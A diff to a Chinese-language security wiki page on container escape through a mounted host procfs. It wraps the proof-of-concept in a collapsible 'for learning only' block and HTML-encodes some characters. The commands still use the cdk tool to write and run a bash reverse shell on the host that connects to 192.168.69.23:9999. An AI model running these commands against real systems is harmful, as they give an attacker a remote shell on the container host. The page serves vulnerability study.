@@ -42,15 +42,18 @@ docker run -v /root/cdk:/cdk -v /proc:/host_proc --rm -it ubuntu bash
 
 我们利用 cdk 写入反弹 shell 并执行：
 
-```
-./cdk run mount-procfs /host_proc 'echo "/bin/bash -i >& /dev/tcp/192.168.69.23/9999 0>&1" > /tmp/rev'
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">./cdk run mount-procfs /host_proc 'echo "/bin/&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.69.23/9999 0&gt;&amp;1" &gt; /tmp/rev'
 ./cdk run mount-procfs /host_proc "chmod +x /tmp/rev"
 ./cdk run mount-procfs /host_proc "bash /tmp/rev"
 
 
 # 或者直接执行：
-# ./cdk run mount-procfs /host_proc "bash -c '/bin/bash -i >& /dev/tcp/192.168.69.23/9999 0>&1'"
-```
+# ./cdk run mount-procfs /host_proc "bash -c '/bin/&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.69.23/9999 0&gt;&amp;1'"</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cloud/images/%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%20procfs%20%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250520113929303.png)
 
